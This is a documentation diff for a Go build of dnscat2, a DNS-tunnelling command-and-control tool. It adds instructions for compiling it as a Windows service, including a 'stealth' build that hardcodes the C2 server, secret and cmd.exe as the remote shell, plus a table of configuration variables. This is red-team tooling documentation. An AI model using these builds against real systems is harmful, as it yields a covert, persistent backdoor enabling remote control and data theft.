@@ -90,6 +90,43 @@ upx --best payload.exe  # Further compress (optional)
 -ldflags="-H windowsgui"  # No console window
 ```
 
+## Windows Service Build
+
+The `cmd/dnscat-service` module enables running dnscat2 as a native Windows service.
+
+**Basic service build:**
+
+```powershell
+# Build without hardcoded config (requires registry configuration)
+go build -o dnscat2-service.exe ./cmd/dnscat-service
+
+# Build with hardcoded config (no registry needed)
+go build -ldflags="-X main.DefaultDnsServer=192.168.1.2 -X main.DefaultSecret=mysecret" -o dnscat2-service.exe ./cmd/dnscat-service
+```
+
+**Stealth service build (recommended):**
+
+```powershell
+# Single-file, hardcoded config, stripped symbols
+go build -ldflags="-s -w -X main.DefaultDnsServer=10.0.0.1 -X main.DefaultSecret=abc123 -X main.DefaultExecCommand=cmd.exe" -o dnscat2-service.exe ./cmd/dnscat-service
+```
+
+**Service build variables:**
+
+| Variable | Description | Example |
+|----------|-------------|---------|
+| `main.DefaultDomain` | Domain to tunnel through | `example.com` |
+| `main.DefaultDnsServer` | DNS server IP | `192.168.1.2` |
+| `main.DefaultDnsPort` | DNS port | `"53"` |
+| `main.DefaultDnsTypes` | DNS record types | `"TXT,CNAME,MX"` |
+| `main.DefaultSecret` | Pre-shared secret | `"mysecret"` |
+| `main.DefaultExecCommand` | Command to execute | `"cmd.exe"` |
+| `main.DefaultDelay` | Packet delay in ms | `"1000"` |
+| `main.DefaultMaxRetransmit` | Max retransmits | `"20"` |
+| `main.DefaultNoEncryption` | Disable encryption | `"true"` |
+| `main.DefaultPacketTrace` | Enable packet trace | `"true"` |
+
+
 ## Notes
 
 - Command-line args override hardcoded defaults
